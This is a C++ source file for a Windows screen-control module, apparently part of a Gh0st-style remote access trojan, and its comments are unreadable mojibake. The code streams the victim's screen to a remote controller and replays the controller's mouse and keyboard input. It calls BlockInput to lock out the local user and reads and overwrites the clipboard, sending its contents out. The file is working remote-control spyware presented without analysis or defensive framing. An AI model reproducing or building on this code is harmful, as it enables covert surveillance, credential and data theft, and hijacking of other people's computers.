// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////
//#define _WIN32_WINNT	0x0400   //������Ҫ���WM_MOUSEWHEEL����ʶ
#include "stdafx.h"
#include "ScreenManager.h"
#include "ClientSocket.h"
#include "Common.h"
#include <Winable.h>


#define WM_MOUSEWHEEL 0x020A
#define GET_WHEEL_DELTA_WPARAM(wParam)((short)HIWORD(wParam))
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_DIFF;   
	m_biBitCount = 32;    //ÿ������Ҫ��λ��  //32
	m_pScreenSpy = new CScreenSpy(32);     
	m_bIsWorking = true;
	m_bIsBlockInput = false;

	//ControlThread�������ض˶Է���˵Ŀ���
	m_hWorkThread = MyCreateThread(NULL,0,
		(LPTHREAD_START_ROUTINE)WorkThread,this,0,NULL,true);
}

CScreenManager::~CScreenManager()
{

}


DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
{
	CScreenManager *pThis = (CScreenManager *)lparam;
	
	pThis->sendBitMapInfo();         //����bmpλͼ�ṹ
	// �ȿ��ƶ˶Ի����
	
	pThis->WaitForDialogOpen();       //�ȴ����ض˵Ļ�Ӧ
	
	pThis->sendFirstScreen();         //���͵�һ֡������
	try // ���ƶ�ǿ�ƹر�ʱ�����
    {
		while (pThis->m_bIsWorking)
		{
		
			pThis->sendNextScreen();      //Ȼ��������ͽ�����������
		}
		
	}catch(...){};
	
	return 0;
}



void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
		switch (lpBuffer[0])
		{
		case COMMAND_NEXT:
			{
				NotifyDialogIsOpen();   // ֪ͨ�ں�Զ�̿��ƶ˶Ի����Ѵ򿪣�WaitForDialogOpen���Է���
				break;
			}
			
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread������
			{
				m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];   //�����̵�����

				BlockInput(m_bIsBlockInput);
				
				break;
				
			}

		case COMMAND_SCREEN_CONTROL:
			{
				//�ſ�����
				BlockInput(false);
				ProcessCommand(lpBuffer + 1, nSize - 1);
				BlockInput(m_bIsBlockInput);  //�ٻظ����û�������


				break;
			}

		case COMMAND_SCREEN_GET_CLIPBOARD:
			{
				SendLocalClipboard();
				break;
			}
	
		case COMMAND_SCREEN_SET_CLIPBOARD:
			{
				UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
				break;
			}
		
			
		default:
			break;
		}
	}catch(...){}
}










void CScreenManager::sendBitMapInfo()
{

	//����õ�bmp�ṹ�Ĵ�С
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO;
	//���ｫbmpλͼ�ṹ���ͳ�ȥ
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	VirtualFree(lpBuffer, 0, MEM_RELEASE);
}




void CScreenManager::sendFirstScreen()
{
   	//��CScreenSpy��getFirstScreen�����еõ�ͼ������
	//Ȼ����getFirstImageSize�õ����ݵĴ�СȻ���ͳ�ȥ
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;
	
	lpFirstScreen = m_pScreenSpy->getFirstScreen();  
	if (lpFirstScreen == NULL)
		return;
	
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;
	
	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);
	
	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}


void CScreenManager::sendNextScreen()
{
   	//�õ����ݣ��õ����ݴ�С��Ȼ����
	//���ǵ�getNextScreen�����Ķ��� 
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	
	if (dwBytes == 0 || !lpNetScreen)
	{
	
		return;
	}
	
	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;
	
	lpBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);
	
	
	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;
}

void CScreenManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{
	// ���ݰ����Ϸ�
	if (nSize % sizeof(MSG) != 0)
		return;
	
	SwitchInputDesktop();
	
	// �������
	int	nCount = nSize / sizeof(MSG);   //
	
	// ����������
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
			{
				POINT point;
				point.x = LOWORD(pMsg->lParam);
				point.y = HIWORD(pMsg->lParam);
				SetCursorPos(point.x, point.y);
				SetCapture(WindowFromPoint(point));
			}
			break;
		default:
			break;
		}
		
		switch(pMsg->message)
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
			break;	
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}	
}



void CScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT|CF_BITMAP);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb); 
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}


void CScreenManager::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;	
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);  //DDE
	if (hglbCopy != NULL) { 
	
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);         
		SetClipboardData(CF_TEXT|CF_BITMAP, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}